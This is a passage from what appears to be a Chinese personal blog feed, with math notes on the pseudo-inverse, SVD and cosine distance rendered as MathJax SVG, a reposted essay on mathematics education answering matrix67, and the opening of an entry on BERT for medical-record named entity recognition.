601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g><g data-mml-node="msup" transform="translate(3452.7, 0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mo" transform="translate(828, 413) scale(0.707)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g></g><g data-mml-node="msup" transform="translate(4880.8, 0)"><g data-mml-node="mi"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g><g data-mml-node="mi" transform="translate(821.2, 413) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g></g></g></g></svg></mjx-container></span></p>
<p><span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0" xmlns="http://www.w3.org/2000/svg" width="3.055ex" height="1.754ex" role="img" focusable="false" viewBox="0 -775.2 1350.1 775.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mo" transform="translate(750, 363) scale(0.707)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g></g></g></g></svg></mjx-container></span>为伪逆，伪逆<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0" xmlns="http://www.w3.org/2000/svg" width="3.231ex" height="1.754ex" role="img" focusable="false" viewBox="0 -775.2 1428.1 775.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mo" transform="translate(828, 363) scale(0.707)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g></g></g></g></svg></mjx-container></span>通过对矩阵 D 的非零元素求倒数后求转 置生成</p>
<p>奇异值分解还能用来降维</p>
<h3 id="距离计算">距离计算</h3>
<h3 id="欧式距离">欧式距离</h3>
<p>略</p>
<h3 id="余弦距离">余弦距离</h3>
<p>计算向量（矩阵）两两之间的相对距离，再除以绝对值</p>
<p><span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.854ex" xmlns="http://www.w3.org/2000/svg" width="15.192ex" height="6.839ex" role="img" focusable="false" viewBox="0 -1761.5 6715 3023"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mi" transform="translate(433, 0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(918, 0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mi" transform="translate(1387, 0)"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z"></path></g><g data-mml-node="mo" transform="translate(2133.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(3189.6, 0)"><g data-mml-node="mrow" transform="translate(609, 709.5)"><g data-mml-node="mo"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(278, 0)"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(14.5, -15)"><path data-c="20D7" d="M377 694Q377 702 382 708T397 714Q404 714 409 709Q414 705 419 690Q429 653 460 633Q471 626 471 615Q471 606 468 603T454 594Q411 572 379 531Q377 529 374 525T369 519T364 517T357 516Q350 516 344 521T337 536Q337 555 384 595H213L42 596Q29 605 29 615Q29 622 42 635H401Q377 673 377 694Z"></path></g></g></g><g data-mml-node="mo" transform="translate(1029.2, 0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(1529.4, 0)"><g data-mml-node="mover"><g data-mml-node="mi" transform="translate(35.5, 0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mo" transform="translate(0, 238)"><path data-c="20D7" d="M377 694Q377 702 382 708T397 714Q404 714 409 709Q414 705 419 690Q429 653 460 633Q471 626 471 615Q471 606 468 603T454 594Q411 572 379 531Q377 529 374 525T369 519T364 517T357 516Q350 516 344 521T337 536Q337 555 384 595H213L42 596Q29 605 29 615Q29 622 42 635H401Q377 673 377 694Z"></path></g></g></g><g data-mml-node="mo" transform="translate(2029.4, 0)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g></g><g data-mml-node="mrow" transform="translate(220, -1012)"><g data-mml-node="mo"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(278, 0)"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(14.5, -15)"><path data-c="20D7" d="M377 694Q377 702 382 708T397 714Q404 714 409 709Q414 705 419 690Q429 653 460 633Q471 626 471 615Q471 606 468 603T454 594Q411 572 379 531Q377 529 374 525T369 519T364 517T357 516Q350 516 344 521T337 536Q337 555 384 595H213L42 596Q29 605 29 615Q29 622 42 635H401Q377 673 377 694Z"></path></g></g></g><g data-mml-node="mo" transform="translate(807, 0)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(1307.2, 0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mo" transform="translate(2029.4, 0)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(2307.4, 0)"><g data-mml-node="mover"><g data-mml-node="mi" transform="translate(35.5, 0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mo" transform="translate(0, 238)"><path data-c="20D7" d="M377 694Q377 702 382 708T397 714Q404 714 409 709Q414 705 419 690Q429 653 460 633Q471 626 471 615Q471 606 468 603T454 594Q411 572 379 531Q377 529 374 525T369 519T364 517T357 516Q350 516 344 521T337 536Q337 555 384 595H213L42 596Q29 605 29 615Q29 622 42 635H401Q377 673 377 694Z"></path></g></g></g><g data-mml-node="mo" transform="translate(2807.4, 0)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g></g><rect width="3285.4" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container></span></p>
<p>余弦相似度： <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="19.523ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 8629 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mi" transform="translate(469, 0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(814, 0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1692, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(2081, 0)"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z"></path></g><g data-mml-node="mo" transform="translate(2550, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(3216.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(4272.6, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(4994.8, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(5995, 0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mi" transform="translate(6428, 0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(6913, 0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mo" transform="translate(7382, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(7771, 0)"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z"></path></g><g data-mml-node="mo" transform="translate(8240, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span></p>
<h2 id="一点闲话">一点闲话</h2>
<p>当年我高中的时候，还挺喜欢看matrix67的网站，喜欢些花里胡哨的东西，所谓“美感”。大一的时候还在寻找公式的数学意义和美感，没事跑到图书馆看数分和抽代（没怎么看懂），感觉matrix67那篇文章还有点<span class="exturl" data-url="aHR0cDovL3d3dy5tYXRyaXg2Ny5jb20vYmxvZy9hcmNoaXZlcy80Mjk0">道理<i class="fa fa-external-link-alt"></i></span>。转折是大二学了模电等几门课，才恍然间发现秋水无涯那篇回应说得真好啊。</p>
<p>秋水无涯的那一篇一直静静的躺在我的浏览器收藏夹里，他的号后来被封了（秋水无涯的豆瓣号已经没了，豆列和读书主页已经不可见，点进去只能看到一些<span class="exturl" data-url="aHR0cHM6Ly9ib29rLmRvdWJhbi5jb20vcGVvcGxlL3p4MzE0MTUvYW5ub3RhdGlvbi8zNjQ3NDY1Lw==">豆瓣笔记<i class="fa fa-external-link-alt"></i></span>和<span class="exturl" data-url="aHR0cHM6Ly9ib29rLmRvdWJhbi5jb20vcGVvcGxlL3p4MzE0MTUvcmV2aWV3cw==">书评<i class="fa fa-external-link-alt"></i></span>），我把文章附在下面。原地址：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZG91YmFuLmNvbS9ub3RlLzE0ODA5NzY2NC8=">我们需要怎样的数学教育？<i class="fa fa-external-link-alt"></i></span></p>
<blockquote>
<p>不同的人，学习数学的目的很不一样。数学的应用价值当然广泛，不过这个世界上也确实有不少韩寒：对他们来说，初二水平的数学就够用了。经常听到的论调是，数学是理性的最高表现形式，因而无论志在何种职业，都应该学一点数学，得到一点思维上的训练。我觉得这个观点似是而非。如果学习数学是为了训练理性思维，那么全民必修的该是一门逻辑课。数学理论当然是逻辑训练的好材料，然而，高深的数学理论并不带来更多逻辑上的挑战——代数几何和平面几何都只用到最基本的三段论而已；另一方面，数学训练的必要性也不等同于充分性。我的朋友中就颇有几个精于数理而迂于世情的——对数学之外的事情，他们比一般人更糊涂。我依然认为他们是芸芸众生中最“聪明”的，但这种“聪明”似乎不是大众学习数学的初衷。事实上，大众对这些“聪明人”采取敬而远之的态度。</p>
<p>很多人废寝忘食地背下了大量公式来应付数学考试，很快忘得一干二净之后又安慰自己说好歹算是训练了逻辑思维——这是毫无含金量的廉价安慰。对大部分人来说，初二水平的数学真的够用了。如果他们愿意学得更多，或者对数学史抱有考古的兴趣，那是个人自由。剥除有限的实用价值，精巧的理论反而是一种不必要的折磨。数学当然有独立于实用价值之外的美，但是强迫每个人都去欣赏，那是大规模犯罪。</p>
<p>不少人还是要用到高等数学的。这里需要澄清的是，所谓“高等数学”，实在是很初等的数学。对于工科学生来说，微积分和线性代数当然是必要的课程。物理系学的更多一些：微分方程，特殊函数，群论外加一些泛函分析。在理论物理的前沿，他们会遇到纤维丛，辛几何和共形场论。然而这仍然只是数学的一部分。我想除了数学家之外，不会有人对类域论感兴趣，更不要说Langlands纲领。这种冷漠是可以理解的。他们大可以理直气壮地问数学家，如果散在的有限单群不是26个而是62个，太阳难道会从西边升起来吗？不能排除这样的可能性，不过，必须承认，单群与星体运行之间的关系，即使存在，也远超出我们的想象力。</p>
<p>工科数学教育最显著的问题似乎是“形式化”。这大概是工具理性的一种表现：为了“短平快”地掌握所需的数学，工科学生学习数学的速度往往是数学系学生的数倍。所以他们几乎从来没有机会弄懂他们所学的究竟是些什么玩意。如果你让他们解释dx是什么，他们给出的回答与其说是数学，不如说是玄学。“以其昏昏使人昭昭”是不可能的，于是这在工科院系成了代代相传的顽疾。唯一的安慰是这不妨碍他们做微积分，做得比数学系的学生还要好。我对这个问题抱宽容的态度：毕竟，Newton也说不清dx是什么。在我看来，真正的症结在于除了公式和计算，工科数学教育所余无几。真正应该强调的是视觉化，讨论大量应用的实例，在实践当中掌握理论。证明是相对次要的事情：如果你对你在做什么有充分的感觉，知道各种事实是如何恰当地组织起来的，写出证明只是一种形式。反之，我不认为“记住”诸如行秩等于列秩的证明有什么用处——即使记住了也很快会忘记，更何况如果你动手解过几个线性方程组，就能“理解”这个显然的结论。</p>
<p>Matrix67同学力陈美感的重要性。然而在我看来，对以数学为志业的人来说，数学必然是“丑”的。这好比游客登山，只看到大道平坦，景致优美，而开荆辟棘的艰辛只有开山者自己能够体会。数学工作者说数学是“美”的，是流尽血汗后终于登顶看到绝美风景的震撼与欣然，这种美和欣赏数学之美的“美”很不一样。多数人以学习数学理论来求得一点审美的愉悦为苦，和真正的数学工作者相比，这不过是“十指不沾泥，鳞鳞居大厦”。另一些人把“数学之美”作为一种广告词。恕我直言，这些人本身大多只是“观光客”，物以类聚，所招徕到的也只能是一群“观光客”。</p>
<p>如何培养未来的数学工作者是一个很大的问题，我不够资格来谈。但至少有一点我是有把握的：应该少谈一点形而上的玩意，多锻炼真功夫。这并不是说要放弃整体的观点。恰恰相反，这意味着在“专”的基础上“博”：仅仅知道Riemann猜想是远远不够的，要知道它如何和整个数学相互作用，在整体图景中处在一个什么位置。那些仅仅将Riemann猜想作为谈资的人，我是不太佩服的。</p>
<p>Matrix67君指责高数课本“荒唐”。宽容一点，我们应该允许工科数学甚至文科“数学”有自己的逻辑和教学方式。严厉地说，则M君只能算是“登堂”，离真正“入室”尚有不小的距离。以他的观点来教育未来的数学工作者，我以为不妥当。</p>
<p>M君的文章，只适用于像他那样的“数学爱好者”。</p>
</blockquote>
]]></content>
      <categories>
        <category>笔记&amp;札记</category>
      </categories>
      <tags>
        <tag>矩阵</tag>
      </tags>
  </entry>
  <entry>
    <title>使用BERT进行电子病历的命名实体识别</title>
    <url>/9112/</url>
    <content><![CDATA[<p>BERT效果确实好，就是有点吃内存</p>
<a id="more"></a>
<h2 id="序列标注">序列标注</h2>
